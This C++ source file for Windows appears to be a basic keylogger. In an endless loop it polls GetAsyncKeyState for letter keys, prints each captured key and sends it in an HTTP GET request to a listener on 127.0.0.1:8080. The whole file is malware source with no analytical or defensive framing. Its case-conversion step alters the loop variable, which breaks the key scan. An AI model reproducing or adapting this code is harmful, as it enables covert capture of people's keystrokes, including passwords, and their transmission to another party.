#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>

using namespace std;

#pragma comment(lib,"Ws2_32.lib")

#include <winsock2.h>


void post_data(char c)
{
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8080);
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	string request = "GET /char/" + to_string(c) + " HTTP/1.1\r\nHost: bla\r\nUser-Agent: me\r\n\r\n";

	send(s, request.c_str(), request.size(), 0);

	closesocket(s);
}


void sampleKeys() {
	for (int c = 'A'; c <= 'Z'; ++c) {
		SHORT r = GetAsyncKeyState(c);
		if ((r & 0x1) != 0) {
			if (GetAsyncKeyState(VK_LSHIFT) == 0) {
				 c += 'a' - 'A';
			}
			printf("%c", c);
			post_data(c);
		}
	}
}


void init_network()
{
	int iResult;
	WSADATA wsaData;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup failed with error: %d\n", iResult);
		return;
	}
}

int main(int argc, const char* argv[])
{
	init_network();

	//post_data(4);
	//return 0;

	while (true) {
		sampleKeys();
	}

}